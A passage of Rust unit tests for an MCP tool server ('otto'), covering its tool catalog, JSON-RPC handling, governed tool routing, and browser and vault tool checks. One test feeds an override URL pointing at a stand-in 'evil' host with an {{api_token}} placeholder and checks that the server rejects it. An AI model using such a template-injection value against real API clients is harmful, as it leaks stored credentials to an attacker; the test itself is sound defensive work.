    fn tool_catalog_lists_the_three_priority_tools() {
        let cat = tool_catalog();
        let names: Vec<&str> = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        assert!(names.contains(&"otto_db_schema"));
        assert!(names.contains(&"otto_git_pr_review"));
        assert!(names.contains(&"otto_product_story"));
    }

    #[test]
    fn tool_catalog_lists_the_connection_db_tools() {
        let cat = tool_catalog();
        let names: Vec<&str> = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        for t in [
            "otto_list_connections",
            "otto_db_schema",
            "otto_db_children",
            "otto_db_object",
            "otto_db_query",
        ] {
            assert!(names.contains(&t), "catalog is missing {t}");
        }
        // Every advertised tool must carry an inputSchema object.
        for tool in cat["tools"].as_array().unwrap() {
            assert!(
                tool["inputSchema"]["type"] == json!("object"),
                "tool {} has no object inputSchema",
                tool["name"]
            );
        }
    }

    #[test]
    fn tool_catalog_lists_the_api_client_tools() {
        let catalog = tool_catalog();
        let tools = catalog["tools"].as_array().unwrap();
        for name in [
            "otto_api_list",
            "otto_api_get_request",
            "otto_api_history",
            "otto_api_execute",
            "otto_api_upsert_request",
            "otto_api_run_automation",
        ] {
            let tool = tools
                .iter()
                .find(|tool| tool["name"] == name)
                .unwrap_or_else(|| panic!("catalog missing API-client tool {name}"));
            assert_eq!(tool["inputSchema"]["type"], json!("object"));
        }
    }

    #[tokio::test]
    async fn api_execute_requires_request_id_or_name() {
        let response = handle(
            &test_ctx(),
            json!({ "jsonrpc": "2.0", "id": 41, "method": "tools/call",
                    "params": { "name": "otto_api_execute", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(response["result"]["isError"], json!(true));
        let text = response["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("request_id"), "got: {text}");
        assert!(
            !text.contains("request failed"),
            "must fail before upstream I/O: {text}"
        );
    }

    #[tokio::test]
    async fn api_execute_rejects_brace_overrides() {
        let response = handle(
            &test_ctx(),
            json!({ "jsonrpc": "2.0", "id": 42, "method": "tools/call",
                    "params": { "name": "otto_api_execute", "arguments": {
                        "request_id": "req-1", "vars": { "base_url": "https://evil/?t={{api_token}}" }
                    } } }),
        )
        .await
        .unwrap();
        assert_eq!(response["result"]["isError"], json!(true));
        let text = response["result"]["content"][0]["text"].as_str().unwrap();
        assert!(
            text.contains("vars override 'base_url' must not contain '{{'"),
            "got: {text}"
        );
        assert!(
            !text.contains("request failed"),
            "must fail before upstream I/O: {text}"
        );
    }

    #[test]
    fn merge_upsert_overlays_args_on_curl_and_omits_auth_when_absent() {
        let parsed = json!({
            "method": "POST",
            "url": "https://parsed.example/items",
            "headers": [{"key":"accept","value":"application/json"}],
            "query": [{"key":"page","value":"1"}],
            "body_mode": "json",
            "body": "{\"from\":\"curl\"}",
            "auth": {"type":"bearer","token":"secret"}
        });
        let merged = merge_upsert(
            &json!({
                "name": "Items",
                "method": "PUT",
                "url": "https://explicit.example/items",
                "body": "{\"from\":\"args\"}",
                "collection_id": "c1",
                "docs_md": "Item docs"
            }),
            Some(&parsed),
            None,
        );
        assert_eq!(merged["name"], json!("Items"));
        assert_eq!(merged["method"], json!("PUT"));
        assert_eq!(merged["url"], json!("https://explicit.example/items"));
        assert_eq!(merged["body"], json!("{\"from\":\"args\"}"));
        assert_eq!(merged["query"], parsed["query"]);
        assert_eq!(merged["auth"], parsed["auth"]);
        assert_eq!(merged["extras"], json!({"v":1,"docs_md":"Item docs"}));

        let without_auth = merge_upsert(&json!({"name":"Health","url":"/health"}), None, None);
        assert_eq!(without_auth["method"], json!("GET"));
        assert_eq!(without_auth["body_mode"], json!("none"));
        assert!(without_auth.get("auth").is_none());
        assert!(without_auth.get("extras").is_none());
    }

    /// An UPDATE that sends one field must not rewrite the rest: the PATCH
    /// route replaces the row wholesale, so the stored values fill every
    /// omitted field (never the GET / `none` create defaults), and `docs_md`
    /// merges into the stored extras instead of dropping its scripts.
    #[test]
    fn merge_upsert_on_update_keeps_every_omitted_stored_field() {
        let stored = json!({
            "id": "q1", "name": "Create order", "method": "POST", "url": "{{base}}/orders",
            "headers": [{"key":"X-Tenant","value":"7","enabled":true}],
            "query": [], "body_mode": "json", "body": "{\"a\":1}", "collection_id": "c9",
            "ssh_connection_id": null, "auth": {"type":"bearer","token":"__keychain__"},
            "extras": {"v":1, "scripts": {"pre": "x()"}}
        });
        let merged = merge_upsert(
            &json!({"url": "{{base}}/v2/orders", "docs_md": "Docs"}),
            None,
            Some(&stored),
        );
        assert_eq!(
            merged["url"],
            json!("{{base}}/v2/orders"),
            "sent field wins"
        );
        assert_eq!(
            merged["method"],
            json!("POST"),
            "not the GET create default"
        );
        assert_eq!(merged["body_mode"], json!("json"));
        assert_eq!(merged["headers"], stored["headers"]);
        assert_eq!(merged["collection_id"], json!("c9"));
        assert_eq!(merged["name"], json!("Create order"));
        assert!(merged.get("auth").is_none(), "auth stays server-side");
        assert!(
            merged.get("ssh_connection_id").is_none(),
            "a null stays absent"
        );
        assert_eq!(merged["extras"]["scripts"]["pre"], json!("x()"));
        assert_eq!(merged["extras"]["docs_md"], json!("Docs"));
    }

    #[test]
    fn pick_by_name_is_case_insensitive_and_reports_ambiguity() {
        let items = json!([
            {"id":"r1","name":"Login"},
            {"id":"r2","name":"Health"}
        ]);
        let items = items.as_array().unwrap();
        assert_eq!(
            pick_by_name(items, "login", "request").unwrap()["id"],
            json!("r1")
        );
        assert_eq!(
            pick_by_name(items, "missing", "request").unwrap_err(),
            "no request named 'missing'"
        );

        let ambiguous = json!([
            {"id":"r1","name":"Login"},
            {"id":"r3","name":"LOGIN"}
        ]);
        let error = pick_by_name(ambiguous.as_array().unwrap(), "login", "request").unwrap_err();
        assert_eq!(error, "ambiguous request 'login': r1, r3");
    }

    /// The cross-workspace list tools read the daemon's directory — every
    /// workspace the owner can read, this session's first — and work without
    /// a session workspace at all (they used to list only `OTTO_WORKSPACE_ID`).
    #[test]
    fn list_tools_span_every_workspace_through_the_directory() {
        assert_eq!(
            directory_path("connection", &json!({}), Some("ws1")),
            "/refs/directory?kind=connection&prefer_workspace_id=ws1"
        );
        assert_eq!(
            directory_path("workflow", &json!({"workspace_id":"ws2"}), None),
            "/refs/directory?kind=workflow&workspace_id=ws2"
        );
        for (tool, _) in NATIVE_DIRECTORY_TOOLS {
            assert!(
                !FEATURE_READ_TOOLS.contains(tool),
                "{tool} is a directory tool"
            );
            let cat = tool_catalog();
            let spec = cat["tools"]
                .as_array()
                .unwrap()
                .iter()
                .find(|t| t["name"] == *tool)
                .cloned()
                .unwrap_or_else(|| panic!("catalog missing {tool}"));
            assert!(
                spec["inputSchema"]["required"].is_null(),
                "{tool} requires nothing"
            );
        }
    }

    #[test]
    fn native_refs_resolve_names_and_the_sole_issue_account() {
        let id = "01KZTKNK3Z8N6VD9Q0MTDQSJ3V";
        // A plain id needs no lookup; a name does.
        assert!(native_ref_plan("otto_db_query", &json!({"connection_id": id})).is_empty());
        assert_eq!(
            native_ref_plan(
                "otto_db_query",
                &json!({"connection_id": "GROOVE_SINATRA_STG"})
            ),
            vec![(
                "connection_id",
                "connection",
                Some("GROOVE_SINATRA_STG".to_string())
            )]
        );
        // An omitted issue account → the owner's only account.
        assert_eq!(
            native_ref_plan("otto_search_issues", &json!({"query":"x"})),
            vec![("account_id", "issue_account", None)]
        );
        // A workspace NAME, and vault / cluster names.
        assert_eq!(
            native_ref_plan("otto_list_sessions", &json!({"workspace_id":"Casino"}))[0],
            ("workspace_id", "workspace", Some("Casino".to_string()))
        );
        assert!(
            native_ref_plan("otto_vault_read", &json!({"vault_id": 1, "path":"a.md"})).is_empty()
        );
        assert_eq!(
            native_ref_plan("otto_vault_read", &json!({"vault_id": "Platform Docs"}))[0].1,
            "vault"
        );
        assert_eq!(
            native_ref_plan("k8s_top", &json!({"cluster_id":"AWS STG"}))[0].1,
            "k8s_cluster"
        );
        // Every table entry names a tool this binary serves.
        let names = native_tool_names();
        for (tool, _, _) in NATIVE_REF_ARGS {
            assert!(
                names.iter().any(|n| n == tool),
                "NATIVE_REF_ARGS names unknown tool {tool}"
            );
        }
    }

    #[test]
    fn config_path_in_reads_flag_and_eq_forms() {
        let a: Vec<String> = ["ottod", "mcp-tools", "--config", "/tmp/c.json"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(config_path_in(&a).as_deref(), Some("/tmp/c.json"));
        let b: Vec<String> = ["ottod", "mcp-tools", "--config=/tmp/x.json"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(config_path_in(&b).as_deref(), Some("/tmp/x.json"));
    }

    #[test]
    fn parse_creds_reads_fields_and_requires_token() {
        let c = parse_creds(
            r#"{"token":"t-1","base":"http://127.0.0.1:7700","session_id":"s-1","workspace_id":"ws-1","source":"vault-docs-review"}"#,
        )
        .unwrap();
        assert_eq!(c.token, "t-1");
        assert_eq!(c.base.as_deref(), Some("http://127.0.0.1:7700"));
        assert_eq!(c.session_id.as_deref(), Some("s-1"));
        assert_eq!(c.workspace_id.as_deref(), Some("ws-1"));
        assert_eq!(c.source.as_deref(), Some("vault-docs-review"));
        // A token-less document is rejected.
        assert!(parse_creds(r#"{"base":"x"}"#).is_err());
    }

    #[tokio::test]
    async fn initialize_returns_protocol_and_serverinfo() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize" }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["protocolVersion"], json!(PROTOCOL_VERSION));
        assert_eq!(resp["result"]["serverInfo"]["name"], json!("otto"));
    }

    #[tokio::test]
    async fn initialized_notification_gets_no_reply() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "method": "notifications/initialized" }),
        )
        .await;
        assert!(resp.is_none(), "a notification must not be answered");
    }

    #[tokio::test]
    async fn tools_list_is_answered() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 2, "method": "tools/list" }),
        )
        .await
        .unwrap();
        assert!(resp["result"]["tools"].is_array());
    }

    // --- Control-plane (governed `otto.*`) tools on the stdio surface ---------
    //
    // What an operator enables under MCP → Otto server must be what a session
    // sees: the enabled `otto.*` catalog is merged into `tools/list` (minus the
    // tools this surface already serves natively) and calls are proxied through
    // the governed invoke route.

    #[test]
    fn governed_stdio_name_maps_the_dotted_catalog_name() {
        assert_eq!(governed_stdio_name("otto.create_pr"), "otto_create_pr");
        assert_eq!(governed_stdio_name("create_pr"), "otto_create_pr");
    }

    #[test]
    fn governed_tools_skip_native_and_aliased_names() {
        let enabled: Vec<String> = [
            "otto.create_pr",         // no native equivalent → advertised
            "otto.list_repos",        // same name natively (otto_list_repos) → skipped
            "otto.get_usage_summary", // native under another name → skipped
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        let tools = governed_tools_for(&enabled);
        let names: Vec<&str> = tools.iter().filter_map(|t| t["name"].as_str()).collect();
        assert_eq!(names, vec!["otto_create_pr"]);
        assert!(
            tools[0]["inputSchema"].is_object(),
            "schema must be carried over"
        );
        assert!(tools[0]["description"]
            .as_str()
            .unwrap()
            .contains("pull request"));
    }

    #[test]
    fn governed_tools_only_advertise_the_enabled_set() {
        let none: Vec<String> = vec![];
        assert!(governed_tools_for(&none).is_empty());
        let enabled = vec!["otto.open_pr_draft".to_string()];
        let names: Vec<String> = governed_tools_for(&enabled)
            .iter()
            .filter_map(|t| t["name"].as_str().map(str::to_string))
            .collect();
        assert_eq!(names, vec!["otto_open_pr_draft"]);
    }

    #[test]
    fn every_governed_spec_is_native_aliased_or_uniquely_advertised() {
        // Invariant: each control-plane tool either collides with a native tool
        // of the same name (the native one wins), is explicitly aliased to a
        // native tool, or maps to a stdio name no native tool uses.
        let native = native_tool_names();
        for spec in otto_server::mcp_outward::otto_tool_specs() {
            let full = spec["name"].as_str().unwrap();
            let short = full.strip_prefix("otto.").unwrap();
            let stdio = governed_stdio_name(full);
            let aliased = GOVERNED_ALIASED_BY_NATIVE
                .iter()
                .any(|(g, n)| *g == short && native.iter().any(|x| x == n));
            let same_name = native.contains(&stdio);
            match governed_tool_for_stdio_name(&stdio) {
                Some(g) => assert_eq!(g, full, "{stdio} must resolve back to {full}"),
                None => assert!(
                    same_name || aliased,
                    "{full} is neither advertised nor covered natively"
                ),
            }
        }
        // And a native tool is never re-routed to the governed path.
        for n in &native {
            assert!(governed_tool_for_stdio_name(n).is_none(), "{n} is native");
        }
    }

    #[tokio::test]
    async fn governed_tool_call_surfaces_daemon_error_not_unknown_tool() {
        // The daemon is unreachable (port 9) so the enabled-set fetch fails; the
        // agent must get a tool error explaining that, not "unknown tool".
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 4, "method": "tools/call",
                    "params": { "name": "otto_create_pr", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(!text.contains("unknown tool"), "got: {text}");
        assert!(text.contains("otto_create_pr"), "got: {text}");
    }

    #[test]
    fn design_writes_are_bridged_through_the_governed_path_only() {
        // `design_assist` / `design_link` have NO native twin: they are served
        // only as the governed `otto_design_*` bridge, so every call goes
        // through the control plane's allow-list → approval → audit (a native
        // tool would bypass the approval gate). The native design tools stay
        // the four reads.
        let native = native_tool_names();
        for w in ["design_assist", "design_link"] {
            assert!(!native.iter().any(|n| n == w), "{w} must not be native");
            assert!(!FEATURE_READ_TOOLS.contains(&w), "{w} is a write");
            let stdio = format!("otto_{w}");
            assert_eq!(
                governed_tool_for_stdio_name(&stdio).as_deref(),
                Some(format!("otto.{w}").as_str()),
                "{stdio} must proxy to the governed tool"
            );
        }
        // Advertised only when the operator enabled them.
        let none: Vec<String> = vec![];
        assert!(!governed_tools_for(&none).iter().any(|t| t["name"]
            .as_str()
            .is_some_and(|n| n.starts_with("otto_design_"))));
        let enabled = vec![
            "otto.design_assist".to_string(),
            "otto.design_link".to_string(),
        ];
        let names: Vec<String> = governed_tools_for(&enabled)
            .iter()
            .filter_map(|t| t["name"].as_str().map(str::to_string))
            .collect();
        assert_eq!(names, vec!["otto_design_assist", "otto_design_link"]);
        // The artifact carries the workspace: no session workspace is injected.
        let ctx = test_ctx();
        let spec = governed_spec_for_stdio_name("otto_design_assist").unwrap();
        let args = governed_invoke_args(&ctx, &spec, &json!({"artifact_id": "A1", "prompt": "x"}));
        assert!(args.get("workspace_id").is_none());
    }

    #[test]
    fn governed_invoke_args_get_the_session_workspace() {
        let ctx = test_ctx();
        let spec = json!({"inputSchema":{"type":"object","required":["workspace_id"],"properties":{"workspace_id":{"type":"string"}}}});
        let filled = governed_invoke_args(&ctx, &spec, &json!({"repo_id":"r1"}));
        assert_eq!(filled["workspace_id"], json!("ws-test"));
        assert_eq!(filled["repo_id"], json!("r1"));
        // An explicit workspace_id is respected, and a schema without one is untouched.
        let kept = governed_invoke_args(&ctx, &spec, &json!({"workspace_id":"other"}));
        assert_eq!(kept["workspace_id"], json!("other"));
        let no_ws =
            json!({"inputSchema":{"type":"object","properties":{"days":{"type":"integer"}}}});
        assert!(governed_invoke_args(&ctx, &no_ws, &json!({}))
            .get("workspace_id")
            .is_none());
        // An OPTIONAL workspace means "span every workspace" (the directory
        // list tools) — injecting the session's would narrow it back.
        let optional = json!({"inputSchema":{"type":"object","properties":{"workspace_id":{"type":"string"}}}});
        assert!(governed_invoke_args(&ctx, &optional, &json!({}))
            .get("workspace_id")
            .is_none());
    }

    /// The bridged git tools (`otto_create_pr`, `otto_git_status`, …) must NOT
    /// get the session's workspace injected: their `repo_id` is resolved across
    /// every readable workspace server-side, and a `workspace_id` would narrow
    /// that back to the session's own — the exact bug this resolution fixes.
    #[test]
    fn governed_git_tools_resolve_across_workspaces_not_the_session_one() {
        let ctx = test_ctx();
        for short in [
            "create_pr",
            "git_status",
            "start_pr_review",
            "open_pr_draft",
        ] {
            let spec = otto_server::mcp_outward::otto_tool_specs()
                .into_iter()
                .find(|s| s["name"] == format!("otto.{short}"))
                .unwrap_or_else(|| panic!("otto.{short} spec"));
            let args = governed_invoke_args(&ctx, &spec, &json!({"repo_id":"promotions"}));
            assert!(args.get("workspace_id").is_none(), "{short}: {args}");
            let required = spec["inputSchema"]["required"]
                .as_array()
                .cloned()
                .unwrap_or_default();
            assert!(
                !required.contains(&json!("repo_id")),
                "{short}: repo_id must be optional (session cwd fallback)"
            );
        }
    }

    #[test]
    fn native_git_tools_take_a_friendly_optional_repo_ref() {
        let catalog = tool_catalog();
        for name in NATIVE_REPO_REF_TOOLS {
            let tool = catalog["tools"]
                .as_array()
                .unwrap()
                .iter()
                .find(|t| t["name"] == *name)
                .unwrap_or_else(|| panic!("{name} in catalog"));
            let schema = &tool["inputSchema"];
            assert_eq!(
                schema["properties"]["repo_id"]["description"],
                json!(REPO_REF_DESC),
                "{name}"
            );
            let required = schema["required"].as_array().cloned().unwrap_or_default();
            assert!(!required.contains(&json!("repo_id")), "{name}");
        }
        // The resolve query forwards the reference + optional filter, encoded.
        assert_eq!(
            resolve_repo_path(&json!({"repo_id":"team/games_management"})),
            "/git/repos/resolve?ref=team%2Fgames_management"
        );
        assert_eq!(
            resolve_repo_path(&json!({"repo_id":"promotions","workspace_id":"ws-b"})),
            "/git/repos/resolve?ref=promotions&workspace_id=ws-b"
        );
        // No reference → the daemon falls back to the session's cwd.
        assert_eq!(resolve_repo_path(&json!({})), "/git/repos/resolve");
    }

    #[test]
    fn list_repos_spans_every_workspace_current_first() {
        assert_eq!(
            read_route("otto_list_repos", &json!({}), Some("ws1")).unwrap(),
            ReadCall::get("/git/repos/directory?prefer_workspace_id=ws1".into())
        );
        assert_eq!(
            read_route(
                "otto_list_repos",
                &json!({"workspace_id":"ws2"}),
                Some("ws1")
            )
            .unwrap(),
            ReadCall::get("/git/repos/directory?workspace_id=ws2&prefer_workspace_id=ws1".into())
        );
        // No session workspace is no longer an error — it just lists everything.
        assert_eq!(
            read_route("otto_list_repos", &json!({}), None).unwrap(),
            ReadCall::get("/git/repos/directory".into())
        );
    }

    #[test]
    fn daemon_error_surfaces_the_problem_message() {
        let status = reqwest::StatusCode::NOT_FOUND;
        let long = "x".repeat(1000);
        let body = json!({"code":"not_found","message": format!("not found: {long}")});
        let msg = daemon_error(status, body.to_string().as_bytes());
        assert!(
            msg.starts_with("daemon returned 404 Not Found: not found: xxx"),
            "{msg}"
        );
        // The whole (bounded) message survives — candidate lists are the point.
        assert!(msg.len() > 1000, "{}", msg.len());
        // A non-Problem body stays a short raw snippet.
        let raw = daemon_error(status, "y".repeat(5000).as_bytes());
        assert!(raw.len() < 400, "{}", raw.len());
        // A module's `{error}` body is surfaced too.
        let e = daemon_error(status, br#"{"error":"no such thing"}"#);
        assert!(e.ends_with("no such thing"), "{e}");
    }

    #[test]
    fn an_empty_success_body_is_ok_not_a_parse_error() {
        assert_eq!(parse_ok_body(b"").unwrap(), json!({"ok": true}));
        assert_eq!(parse_ok_body(b" \n").unwrap(), json!({"ok": true}));
        assert_eq!(parse_ok_body(br#"{"a":1}"#).unwrap(), json!({"a": 1}));
        assert!(parse_ok_body(b"<html>").is_err());
    }

    #[tokio::test]
    async fn unknown_method_is_method_not_found() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 9, "method": "frobnicate" }),
        )
        .await
        .unwrap();
        assert_eq!(resp["error"]["code"], json!(-32601));
    }

    #[tokio::test]
    async fn unknown_tool_returns_error_content() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 3, "method": "tools/call",
                    "params": { "name": "nope", "arguments": {} } }),
        )
        .await
        .unwrap();
        // Tool-level error: RPC success, isError true, message mentions the tool.
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("nope"));
    }

    #[test]
    fn catalog_lists_feature_read_tools() {
        let cat = tool_catalog();
        let names: Vec<&str> = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        for t in FEATURE_READ_TOOLS {
            assert!(names.contains(t), "catalog missing feature read tool {t}");
        }
        // Every advertised tool carries an object inputSchema.
        for tool in cat["tools"].as_array().unwrap() {
            assert_eq!(
                tool["inputSchema"]["type"],
                json!("object"),
                "tool {} has no object inputSchema",
                tool["name"]
            );
        }
    }

    #[test]
    fn design_reads_are_native_read_only_and_route_to_the_design_api() {
        let cat = tool_catalog();
        let tools = cat["tools"].as_array().unwrap();
        for t in ["design_list", "design_get", "design_links", "design_search"] {
            let tool = tools
                .iter()
                .find(|x| x["name"] == t)
                .unwrap_or_else(|| panic!("catalog missing design tool {t}"));
            assert!(
                tool["description"]
                    .as_str()
                    .unwrap()
                    .starts_with("Read-only"),
                "{t} must advertise itself as read-only"
            );
            assert!(
                FEATURE_READ_TOOLS.contains(&t),
                "{t} must be a feature read"
            );
            // Served natively — never re-advertised through the governed path.
            assert!(governed_tool_for_stdio_name(t).is_none(), "{t}");
            assert!(
                governed_tool_for_stdio_name(&format!("otto_{t}")).is_none(),
                "{t}"
            );
        }
        let ws = Some("ws1");
        assert_eq!(
            read_route("design_list", &json!({}), ws).unwrap().path,
            "/design/artifacts"
        );
        assert_eq!(
            read_route("design_list", &json!({"studio": "3d"}), ws)
                .unwrap()
                .path,
            "/design/artifacts?studio=3d"
        );
        assert_eq!(
            read_route(
                "design_list",
                &json!({"limit": 2, "cursor": "2026-09-23T10:00:00Z|A9"}),
                ws
            )
            .unwrap()
            .path,
            "/design/artifacts?limit=2&cursor=2026-09-23T10%3A00%3A00Z%7CA9"
        );
        let c = read_route(
            "design_get",
            &json!({"artifact_id": "A1", "version": "v2"}),
            ws,
        )
        .unwrap();
        assert!(!c.post);
        assert_eq!(c.path, "/design/artifacts/A1?content=true&version=v2");
        assert_eq!(
            read_route(
                "design_links",
                &json!({"artifact_id": "A1", "dir": "in"}),
                ws
            )
            .unwrap()
            .path,
            "/design/artifacts/A1/links?dir=in"
        );
        assert_eq!(
            read_route(
                "design_search",
                &json!({"query": "hero card", "status": "shipped"}),
                None
            )
            .unwrap()
            .path,
            "/design/search?q=hero%20card&status=shipped"
        );
        assert!(read_route("design_get", &json!({}), ws).is_err());
        assert!(read_route("design_search", &json!({}), ws).is_err());
    }

    #[test]
    fn catalog_lists_the_canvas_write_tools() {
        let cat = tool_catalog();
        let names: Vec<&str> = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        assert!(
            names.contains(&"canvas_create_scene"),
            "catalog missing canvas_create_scene"
        );
        assert!(
            names.contains(&"canvas_update_scene"),
            "catalog missing canvas_update_scene"
        );
    }

    #[test]
    fn catalog_lists_the_browser_tools() {
        let cat = tool_catalog();
        let names: Vec<&str> = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        for t in [
            "browser_navigate",
            "browser_page",
            "browser_query",
            "browser_summarize",
            "browser_marks",
            "browser_login",
        ] {
            assert!(names.contains(&t), "catalog missing {t}");
        }
    }

    #[tokio::test]
    async fn browser_marks_errors_without_workspace() {
        let mut ctx = test_ctx();
        ctx.workspace_id = None;
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 26, "method": "tools/call",
                    "params": { "name": "browser_marks", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("workspace"));
    }

    #[tokio::test]
    async fn browser_navigate_errors_without_url() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 20, "method": "tools/call",
                    "params": { "name": "browser_navigate", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("url"), "got: {text}");
    }

    #[tokio::test]
    async fn browser_navigate_errors_without_workspace() {
        let mut ctx = test_ctx();
        ctx.workspace_id = None;
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 21, "method": "tools/call",
                    "params": { "name": "browser_navigate", "arguments": { "url": "https://a.io" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("workspace"));
    }

    #[tokio::test]
    async fn browser_page_errors_without_url() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 22, "method": "tools/call",
                    "params": { "name": "browser_page", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("url"), "got: {text}");
    }

    #[tokio::test]
    async fn browser_page_errors_without_workspace() {
        let mut ctx = test_ctx();
        ctx.workspace_id = None;
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 23, "method": "tools/call",
                    "params": { "name": "browser_page", "arguments": { "url": "https://a.io" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("workspace"));
    }

    #[tokio::test]
    async fn browser_query_errors_without_selector() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 24, "method": "tools/call",
                    "params": { "name": "browser_query", "arguments": { "url": "https://a.io" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("selector"), "got: {text}");
    }

    #[tokio::test]
    async fn browser_summarize_errors_without_url() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 25, "method": "tools/call",
                    "params": { "name": "browser_summarize", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("url"), "got: {text}");
    }

    #[tokio::test]
    async fn browser_login_errors_without_domain() {
        let ctx = test_ctx();
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 26, "method": "tools/call",
                    "params": { "name": "browser_login", "arguments": {} } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        let text = resp["result"]["content"][0]["text"].as_str().unwrap();
        assert!(text.contains("domain"), "got: {text}");
    }

    #[tokio::test]
    async fn browser_login_errors_without_workspace() {
        let mut ctx = test_ctx();
        ctx.workspace_id = None;
        let resp = handle(
            &ctx,
            json!({ "jsonrpc": "2.0", "id": 27, "method": "tools/call",
                    "params": { "name": "browser_login", "arguments": { "domain": "example.com" } } }),
        )
        .await
        .unwrap();
        assert_eq!(resp["result"]["isError"], json!(true));
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("workspace"));
    }

    #[test]
    fn catalog_lists_the_vault_tools() {
        let cat = tool_catalog();
        let names: Vec<&str> = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap())
            .collect();
        for t in [
            "otto_vault_list",
            "otto_vault_dir",
            "otto_vault_read",
            "otto_vault_search",
            "otto_vault_backlinks",
            "otto_vault_tags",
            "otto_vault_graph",
            "otto_vault_okf_validate",
            "otto_vault_write",
            "otto_vault_write_file",
            "otto_vault_rename",
            "otto_vault_delete",
        ] {
            assert!(names.contains(&t), "catalog missing {t}");
        }

        let write_file = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .find(|tool| tool["name"] == "otto_vault_write_file")
            .unwrap();
        assert_eq!(
            write_file["inputSchema"]["required"],
            json!(["vault_id", "path", "content"])
        );
        assert_eq!(
            write_file["inputSchema"]["properties"]["content"]["type"],
            json!("string")
        );
    }

    #[test]
    fn vault_docs_review_source_gets_read_only_vault_catalog() {
        let cat = tool_catalog_for_source(Some("vault-docs-review"));
        let names: Vec<&str> = cat["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|tool| tool["name"].as_str().unwrap())
            .collect();
        for read in ["otto_vault_list", "otto_vault_read", "otto_vault_search"] {
            assert!(names.contains(&read), "reviewer catalog missing {read}");
        }
        for mutation in [
            "otto_vault_write",
            "otto_vault_write_file",
            "otto_vault_rename",
            "otto_vault_delete",
        ] {
            assert!(
                !names.contains(&mutation),
                "reviewer catalog leaked {mutation}"
            );
        }

        let normal = tool_catalog_for_source(Some("vault-docs"));
        assert!(normal["tools"]
            .as_array()
            .unwrap()
            .iter()
            .any(|tool| tool["name"] == "otto_vault_write"));
    }

    #[test]
    fn reviewer_read_bridge_maps_only_vault_reads_to_governed_tools() {
        let (tool, args) = reviewer_read_invoke(
            "otto_vault_read",
            &json!({"vault_id": 7, "path": "api/widgets.md"}),
            "workspace-1",
        )
        .expect("vault read must be routed through the governed MCP choke point");
        assert_eq!(tool, "otto.vault_read");
        assert_eq!(args["workspace_id"], "workspace-1");
        assert_eq!(args["vault_id"], 7);
        assert_eq!(args["path"], "api/widgets.md");
        assert!(reviewer_read_invoke(
            "otto_vault_write",
            &json!({"vault_id": 7, "path": "x.md", "content": "x"}),
            "workspace-1",
        )
        .is_none());
    }

    #[tokio::test]
    async fn vault_docs_review_source_cannot_call_hidden_vault_mutations() {
        let mut ctx = test_ctx();
